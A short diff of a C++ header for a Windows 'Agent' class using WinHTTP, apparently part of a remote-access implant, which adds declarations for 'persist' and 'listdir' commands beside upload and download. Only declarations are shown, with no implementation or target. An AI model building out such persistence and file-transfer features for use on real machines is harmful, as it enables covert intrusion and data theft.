@@ -5,6 +5,7 @@
 #include <Windows.h>
 #include <winhttp.h>
 
+#include "Config.h"
 
 
 class Agent {
@@ -32,5 +33,6 @@ public:
 	//static void psimport(std::vector<std::string> args);
 	static void upload(std::vector<std::string> args);
 	static void download(std::vector<std::string> args);
-
+	static void persist(std::vector<std::string> args);
+	static void listdir(std::vector<std::string> args);
 };
